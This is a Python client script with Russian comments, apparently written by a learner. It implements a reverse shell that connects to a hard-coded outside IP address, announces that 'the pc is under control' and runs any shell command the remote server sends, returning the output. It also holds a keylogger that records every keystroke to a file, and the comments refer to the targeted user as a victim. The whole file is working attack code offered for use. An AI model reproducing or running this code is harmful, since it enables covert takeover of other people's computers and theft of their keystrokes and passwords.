import socket
import time
import datetime
import threading
import os
import subprocess
from pynput.keyboard import Listener
"""
Также как и на серверной стороне, здесь будут фигурировать внутренние локальные IP, которые 
можно посмотреть в ipconfig в cmd.
Далее и на клиентской стороне сперва надо создать сокет. 
"""

#две функции ниже это key логгеры
def write(key):
    keydata = str(key)
    #print(keydata)
    #keydata.replace("'", " ") '''123```
    with open("keylog.txt", "a") as f:
        f.write(keydata)

def start_logger():
    #очень странный механизм запуска но тем не менее
    with Listener(on_press=write) as l:
        l.join()

def despatch(ip, port, message):
    """
    Обычная функция которая принимает айпи, порт и сообщение и шлет на сервер
    """
    #UDP протокол
    #s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    #s.sendto(b'Artem', ('127.0.0.1', 8888))

    #TCP протокол
    #можно также оставить скубки пустыми и будет все работать
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    #прописываем куда будем делать коннект, адрес сервера и порт на котором он слушает
    sock.connect((ip, port))

    #далее всегда надо шифровать в байты перед посылкой, иначе ошибки
    #для отправки используем метод сокета send.
    sock.send((f'{message}').encode())

    #после того как мы что то послали, мы можем получить ответ через метод recv (как и на сервере)
    #эту строку надо убрать если мы ничего от сервера не получаем, иначе повиснет
    data = sock.recv(1024)
    #и посмотреть дату через принт
    print(data.decode())

    #дальше всегда закрываем соединение
    sock.close()

def accept_attack(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    #дописать в лог айпи атакованной машины и ее порт
    sock.send(("The pc is under control").encode())

    #как только жертва под контролем начинаем писать лог нажатий
    #на текущем этапе не работает, запускать в соседнем треде, что бы основной не блокировался
    #start_logger()

    while True:
        data = sock.recv(1024)
        print(data.decode(), ": incoming answer from server")
        if data.decode() == "quit":
            break
        #у пустой строки длинна равна 1, поэтому 1 наша точка отсчета
        if len(data) > 1:
            if data[:2].decode() == "cd":
                try:
                    os.chdir(data[3:].decode())
                    #сервер всегда ждет ответ, если не слать ничего и пропустить шаг ниже - сервер повиснет
                    #шлем текущую директорию в которую мы перешли
                    sock.send(os.getcwd().encode())
                except Exception as e:
                    print(e)
            else:
                #далее открывается shell и запускаются команды, Popen берет строку, поэтому конвертим
                #шел указываем True (хз пока зачем), может быть даем видеть атакуемому командную строку.
                #и в стдартном вводе, выводе, ошибке пишем subprocess.PIPE (наверное для конвертации всего в строку)
                cmd = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

                #далее пишем ответ консоли в перменную (не конвертируем так как ответ в байтах, и слать тоже надо байты)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                #на всякий случай заимеем ответ также в виде строки
                output_string = str(output_bytes, "cp866")

                sock.send(output_bytes)
        else:
            sock.send(b"Unknown command")
            print("Unknown command was sended")
    sock.close()

accept_attack("109.237.25.179", 9090)